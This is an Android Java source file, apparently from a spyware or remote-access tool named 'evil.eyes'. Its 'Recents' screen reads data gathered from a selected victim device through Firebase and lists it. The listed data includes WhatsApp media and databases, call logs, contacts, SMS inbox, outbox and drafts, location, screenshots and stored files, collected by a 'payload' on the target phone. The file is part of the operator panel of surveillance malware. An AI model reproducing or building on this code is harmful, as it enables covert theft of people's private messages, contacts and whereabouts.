package evil.eyes.ui.fragments;

import android.os.Bundle;

import androidx.annotation.NonNull;
import androidx.appcompat.widget.AppCompatButton;
import androidx.fragment.app.Fragment;
import androidx.recyclerview.widget.RecyclerView;

import android.os.Environment;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.LinearLayout;
import android.widget.Toast;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.util.ArrayList;
import java.util.List;

import evil.eyes.R;
import evil.eyes.core.DeviceConfig;
import evil.eyes.core.RecentModel;
import evil.eyes.core.adapters.DeviceViwer;
import evil.eyes.core.adapters.RecentAdapter;
import evil.eyes.core.utils.PayloadTypes;
import evil.eyes.ui.Home;

public class Recents extends Fragment {

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        // Inflate the layout for this fragment
        View view = inflater.inflate(R.layout.fragment_recents, container, false);

        RecyclerView recyclerView = view.findViewById(R.id.recyCler);
        LinearLayout no_device = view.findViewById(R.id.no_found);
        AppCompatButton setDevice = view.findViewById(R.id.setDevice);

        List<RecentModel> recentModels = new ArrayList<>();
        DeviceConfig deviceConfig = DeviceConfig.getInstance(view.getContext()).initializeStorage();

        if (deviceConfig.getSelectedDevice().getUUID() == null) {
            no_device.setVisibility(View.VISIBLE);
            recyclerView.setVisibility(View.GONE);

            setDevice.setOnClickListener(t -> {
                if (Home.viewPager != null) Home.viewPager.setCurrentItem(4);
                else
                    Toast.makeText(view.getContext(), "Internal Error !!, try setting default device manually !!", Toast.LENGTH_SHORT).show();
            });

        } else {
            recyclerView.setVisibility(View.VISIBLE);
            no_device.setVisibility(View.GONE);

            FirebaseDatabase
                    .getInstance()
                    .getReference("LIVE")
                    .child(deviceConfig.getSelectedDevice().getUUID())
                    .addListenerForSingleValueEvent(new ValueEventListener() {
                        @Override
                        public void onDataChange(@NonNull DataSnapshot snapshot) {
                            if (snapshot.exists()) {
                                for (DataSnapshot dataSnapshot : snapshot.getChildren()) {
                                    String getName = getName(dataSnapshot.getKey());
                                    recentModels.add(new RecentModel(dataSnapshot.getValue(String.class), getName, null, dataSnapshot.getKey()));
                                }

                                recyclerView.setAdapter(new RecentAdapter(recentModels, false));
                            }
                        }

                        @Override
                        public void onCancelled(@NonNull DatabaseError error) {
                            Toast.makeText(getContext(), " " + error.getMessage(), Toast.LENGTH_SHORT).show();
                        }
                    });
        }

        return view;
    }

    private String getName(String key)  {
        String name = "";
        switch (key){
            case "whatsapp_media_"+PayloadTypes.GET_WHATSAPP_STATUS:
                name = "Whatsapp status updates";
                break;
            case "whatsapp_media_"+PayloadTypes.GET_WHATSAPP_GIFS:
                name = "Whatsapp Gifs";
                break;
            case "whatsapp_media_"+PayloadTypes.GET_WHATSAPP_AUDIO:
                name = "Whatsapp Audio";
                break;
            case "whatsapp_media_"+PayloadTypes.GET_WHATSAPP_DOCUMENTS:
                name = "WhatsApp documents";
                break;
            case "whatsapp_media_"+PayloadTypes.GET_WHATSAPP_IMAGES:
                name = "WhatsApp Images";
                break;
            case "whatsapp_media_"+PayloadTypes.GET_WHATSAPP_PROFILE_PICS:
                name = "WhatsApp profile pics";
                break;
            case "whatsapp_media_"+PayloadTypes.GET_WHATSAPP_STICKERS:
                name = "Whatsapp Stickers";
                break;
            case "whatsapp_media_"+PayloadTypes.GET_WHATSAPP_VIDEOS:
                name = "Whatsapp Videos";
                break;
            case "whatsapp_media_"+PayloadTypes.GET_WHATSAPP_VOICE_NOTES:
                name = "Whatsapp Voice notes";
                break;
            case "deviceInfo":
                name = "Device Info";
                break;
            case "BATTERY":
                name = "Battery Info";
                break;
            case "permission":
                name = "Payload permission Info";
                break;
            case "calls":
                name = "Call logs";
                break;
            case "contacts":
                name = "Contacts Logs";
                break;
            case "location":
                name = "Location Info";
                break;
            case "sms_inbox":
                name = "Received sms logs";
                break;

            case "sms_outbox":
                name = "Sent sms logs";
                break;

            case "sms_draft":
                name = "Draft sms logs";
                break;

            case "screenshots":
                name = "Stored screenshots";
                break;

            case "wbDb":
                name = "WhatsApp Databases";
                break;

            case "phone_media_"+PayloadTypes.GET_DEVICE_FOLDER:
                name = "File from storage";
                break;

            default:
                name = "ERROR";
                break;
        }
        return name;
    }
}